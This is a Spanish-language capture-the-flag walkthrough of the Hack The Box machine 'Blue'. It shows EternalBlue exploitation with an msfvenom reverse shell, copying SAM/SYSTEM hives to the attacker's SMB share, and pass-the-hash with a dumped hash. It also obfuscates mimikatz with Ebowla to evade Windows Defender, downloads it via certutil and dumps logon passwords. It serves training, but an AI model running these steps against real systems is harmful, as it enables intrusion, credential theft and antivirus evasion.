&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p135&lt;/span&gt;,139,445,49152 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/script_nmap.png&quot; alt=&quot;script nmap.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el puerto 445 esta abierto en el cual corre el servicio SMB y lo analizamos con crackmapexec&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.10.40 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como vemos que es un widows 7 profesional y si el smb esta expuesto puede que sea vulnerable al eternal blue así que vamos a analizar ese puerto primero&lt;/p&gt;

&lt;p&gt;Ejecutamos un script de nmap para verificar si es vulnerable al eternal blue&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;vuln and safe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p445&lt;/span&gt; 10.10.10.40 oN smbVulnscan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/script_vulnerabilidades.png&quot; alt=&quot;script vulnerabilidades.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En efecto vemos que es vulnerable y nos pone Remote code execution&lt;/p&gt;

&lt;h1 id=&quot;explotación&quot;&gt;Explotación&lt;/h1&gt;

&lt;p&gt;Buscamos un repositorio en github donde se encuentran unos scripts para explotar la vulnerabilidad manualmente, nos dirigimos a la carpeta exploits y nos clonamos el repositorio&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/d4t4s3c/Win7Blue.git

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos dirigimos a la carpeta que acabamos de clonar y buscamos eternal blue scanner y lo ejecutamos&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 eternalblue_scanner.py 10.10.10.40
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/Vulnerable.png&quot; alt=&quot;Vulnerable.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luego de verificar que es Vulnerable creamos un payload con msf venom&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; payload.bin &lt;span class=&quot;nv&quot;&gt;EXITFUNC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;thread &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.9 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Colocamos nuestra ip en LHOST y el puerto que queramos para la reverse shell, -o el nombre que queramos asignarle al payload&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/payload.png&quot; alt=&quot;payload.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luego de crear el payload hacemos un merge con cat de el archivo  sc_x64_kernel.bin y payload.bin generado anteriormente&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;sc_x64_kernel.bin payload.bin &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/merge.png&quot; alt=&quot;merge.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora procedemos a lanzar el scrript ms17_010_eternalblue.py, pero antes de lanzarlo nos ponemos en escucha con netcat&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora lanzamos el script para explotar la vulnerabilidad eternal blue&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 ms17_010_eternalblue.py 10.10.10.40 exploit.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si no funciona a la primera volver a intentar hasta que nos entable la conexión, y listo ya tendríamos acceso a la maquina victima.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/acceso_a_la_maquina.png&quot; alt=&quot;acceso a la maquina.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez con acceso a la maquina verificamos que tipo de usuario somos&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/whoami.png&quot; alt=&quot;whoami.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que somos nt authority\system, procedemos a buscar las flags, ya que en este caso somos un usuario con máximos privilegios y este tipo de vulnerabilidad ya nos otorga dichos privilegios, en otros casos tendremos que elevar privilegios.&lt;/p&gt;

&lt;p&gt;Procedemos a buscar las flags, primero la de el user&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/user.png&quot; alt=&quot;user.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luego la de root&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/root.png&quot; alt=&quot;root.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo con esto estaría completada la maquina, no obstante se harán un par de cosas extras como ejemplo que puedan servir para practicar y para otras maquinas.&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios&lt;/h1&gt;

&lt;p&gt;Como ya lo mencionamos la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa.&lt;/p&gt;

&lt;h1 id=&quot;extra&quot;&gt;Extra&lt;/h1&gt;

&lt;p&gt;Como extra nos dirigiremos al directorio Temp&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Windows\Temp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos crearemos un directorio llamado PostExploitation&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PostExploitation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;luego entramos en ese directorio&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PostExploitation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;El recurso sam y system normalmente están en uso por el sistema, el siguiente paso seria crear una copia de estos. Como poseemos máximos privilegios lo hacemos de la siguiente manera&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\sam&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sam.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/sam_y_system.png&quot; alt=&quot;sam y system.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora los vamos a trasladar a nuestro sistema para analizarlos, los copiamos en la carpeta content, los vamos a copiar utilizando impacket&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;iniciamos el recurso compartido en la carpeta content donde los copiaremos&lt;/p&gt;

&lt;p&gt;Para pasar los archivos utilizamos el siguiente comando en la maquina victima&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sam.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.9\smbFolder\sam&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.9\smbFolder\system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En este caso lo copiaremos a nuestro equipo solo como sam y haremos lo mismo para system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/sam_y_system_copy.png&quot; alt=&quot;sam y system copy.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora cerramos el impacket y ahi tendremos los archivos&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/files.png&quot; alt=&quot;files.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a utilizar impacket-secretsdump de la siguiente manera, recordemos que no necesitamos colocar una ip porque ya los tenemos en local&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-secretsdump &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; sam &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; system LOCAL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/dump.png&quot; alt=&quot;dump.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aquí tendríamos lo que nos interesa, que son los hashes de los usuarios&lt;/p&gt;

&lt;p&gt;Con esto verificamos si el hash es correcto&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec cmb 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator. -H '&lt;/span&gt;cdf51b162460b7d5bc898f493751a0cc&lt;span class=&quot;s1&quot;&gt;'
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;y nos pondrá Pwn3d! y con esto ya tendríamos como una persistencia y hacer cosas.&lt;/p&gt;

&lt;p&gt;Por ejemplo dumpear lsa a ver si logramos ver algo en texto claro&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec cmb 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator. -H '&lt;/span&gt;cdf51b162460b7d5bc898f493751a0cc&lt;span class=&quot;s1&quot;&gt;' --lsa
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;No logramos ver nada interesante en texto claro entonces lo descartamos&lt;/p&gt;

&lt;p&gt;Podemos operar para conectarnos a la maquina por ejemplo&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-psexec WORKGROUP/Adminnistrator@10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :cdf51b162460b7d5bc898f493751a0cc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Con esto lograríamos hacer pass the hash  y tener una pequeña persistencia porque ya tenemos el hash&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/pass_the_hash.png&quot; alt=&quot;pass the hash.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a ver de que forma podemos obtener la contraseña, para ello vamos a utilizar mimikatz, primero lo localizamos en nuestro equipo y lo copiamos a la carpeta content&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;locate mimikatz.exe
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/mimikatz/x64/mimikatz.exe &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luego utilizaremos una herramienta para burlar el defender y posibles detecciones en base a lo que nosotros subamos a la maquina victima.&lt;/p&gt;

&lt;p&gt;Nos clonamos el siguiente repositorio&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/Genetic-Malware/Ebowla
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Esta herramienta sirve para tratar de eludir posibles detecciones ya que juega con las propias variables de entorno de la maquina, para crear una muestra cifrada por decirlo o ofuscada, donde se emplea las propias variables de entorno del sistema donde una vez se ejecute descifrar la muestra y llegara a poder ejecutarlo.&lt;/p&gt;

&lt;p&gt;Nos dirigimos a la carpeta Ebowla y modificaremos un par de cosas de el archivo genetic.config&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;output_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; GO
payload_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; EXE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;la parte que mas retocamos es la de variables de entorno [[ENV_VAR]] hay que tener cuidado porque si nos equivocamos con alguna de las variables de entorno existentes la muestra no la va a lograr interpretar porque recordemos que toma las variables de entorno de la propia maquina para que cuando subamos la muestra que esta cifrada a la hora de tratar de descifrar esa muestra para interpretarla como nos equivoquemos no va a interpretar nada.&lt;/p&gt;

&lt;p&gt;Desde la maquina victima tomaremos las variables de entorno con los siguientes comandos&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;computername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;homepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y así para cada una una de las variables de entorno, recordemos que si una no la reporta no la ponemos para evitar problemas, también cuando mas variables de entorno coloquemos mejor, pero no necesitamos colocarlas todas.&lt;/p&gt;

&lt;p&gt;Nos debería quedar algo así&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/variables_de_entorno.png&quot; alt=&quot;variables de entorno.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para compilar como python2 ya no tiene soporte tendríamos que instalarlo e instalar las de dependencias que nos den error hasta que ya podamos ejecutar el script&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 ebowla.py mimikatz.exe genetic.config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aquí le pasamos el archivo a cifrar y el archivito genetic.conf previamente configurado con las variables de entorno.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/ebowla.png&quot; alt=&quot;ebowla.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo ya tendríamos el archivo en la carpeta output&lt;/p&gt;

&lt;p&gt;Ahora vamos a compilar el archivo que nos genero en output&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./build_x64_go.sh output/go_symmetric_mimikatz.exe.go mimi.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;le asignamos el nombre que queramos, en este caso lo llame mimi.exe, si todo sale bien nos pondrá esto, si nos da algún error solo instalar los paquetes necesarios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/mimi_encode.png&quot; alt=&quot;mimi encode.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos vamos a transferir el archivo con python3 por el puerto 80 a la maquina victima&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora nos descargamos el archivo desde la maquina victima haciendo uso de certutil&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://10.10.14.9/mimi.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/download_file.png&quot; alt=&quot;download file.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo ya tendríamos el archivo en la maquina victima&lt;/p&gt;

&lt;p&gt;Ahora a ejecutar nuestro archivo&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;mimi.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/mimikatz.png&quot; alt=&quot;mimikatz.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo nos funciono ahora vamos por  las credenciales&lt;/p&gt;

&lt;p&gt;Lo hacemos de la siguiente manera&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;privilege::debug&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sekurlsa::logonPasswords&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si todo sale bien nos mostrara la credencial&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/credentials.png&quot; alt=&quot;credentials.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hay que tener en cuenta que a veces en entornos empresariales comprometes un equipo no privilegiado pero en la memoria consigues las credenciales de un administrador del dominio, y esto es importante ya que con esto tenemos acceso a todos los equipos de la red.&lt;/p&gt;

&lt;p&gt;Listo con esto tendríamos varias maneras y caminos los cuales nos servirán mucho para otras máquinas, recuerden que la practica hace al maestro.&lt;/p&gt;

&lt;p&gt;Les dejo la resolución de la misma por s4vitar &lt;a href=&quot;https://www.youtube.com/watch?v=92XycxcAXkI&quot;&gt;Ver video&lt;/a&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="SMB Enumeration" /><category term="Eternalblue Exploitation(MS17-010)" /><category term="Persistence" /><category term="Windows Defender Evasion" /><summary type="html">Blue es una maquina donde estaremos explotando la famosa vulnerabilidad eternalblue MS17-010 pero manualmente haciendo uso de un exploit en github, luego de comprometer la maquina, practicaremos técnicas de evasión de defender y un par de cosas más.</summary></entry></feed>